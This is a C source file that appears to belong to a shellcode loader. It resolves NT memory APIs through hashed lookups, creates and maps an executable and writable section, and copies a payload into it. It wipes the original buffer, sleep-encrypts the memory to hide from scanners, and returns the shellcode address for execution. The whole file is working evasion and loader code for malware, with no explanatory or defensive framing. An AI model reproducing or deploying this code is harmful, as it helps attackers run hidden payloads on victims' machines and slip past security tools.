#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"
#include "../../../includes/utils/utils.h"



BOOL memory_load_apis() {
	g_ldr->apis->NtCreateSection = (pNtCreateSection)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCREATESECTION);
	g_ldr->apis->NtMapViewOfSection = (pNtMapViewOfSection)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTMAPVIEWOFSECTION);
	g_ldr->apis->NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTUNMAPVIEWOFSECTION);
	g_ldr->apis->NtCloseHandle = (pNtCloseHandle)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTCLOSE);

	return g_ldr->apis->NtCreateSection && g_ldr->apis->NtMapViewOfSection
		&& g_ldr->apis->NtUnmapViewOfSection && g_ldr->apis->NtCloseHandle;
}

MemoryInfo memory_run(LPVOID PayloadAddress, SIZE_T PayloadSize) {
	MemoryInfo memInfo = { 0 };
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize = { .QuadPart = PayloadSize };
    NTSTATUS status = g_ldr->apis->NtCreateSection(
        &hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) {
        DBGA("[!] NtCreateSection failed | 0x%lx\n", status);
        memInfo.ok = FALSE;
        return memInfo;
    }

    ldr_sleep_encrypt_heap(g_ldr->config->DelayBetween, PayloadAddress, PayloadSize);

    PVOID Address = NULL;
    SIZE_T viewSize = 0;
    status = g_ldr->apis->NtMapViewOfSection(
        hSection, (HANDLE)-1, &Address, 0, 0, NULL,
        &viewSize, 2, 0, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        DBGA("[!] NtMapViewOfSection failed | 0x%lx\n", status);
        g_ldr->apis->NtCloseHandle(hSection);
        memInfo.ok = FALSE;
        return memInfo;
    }

    memcpy(Address, PayloadAddress, PayloadSize);

    clear_payload(PayloadAddress, PayloadSize);
    ldr_sleep_encrypt_heap(g_ldr->config->DelayBetween, Address, PayloadSize);

    g_ldr->apis->NtCloseHandle(hSection);

	

	memInfo.ShellCodeAddress = Address;
	memInfo.ok = TRUE;
	memInfo.BytesWrote = PayloadSize;
	return memInfo;
}
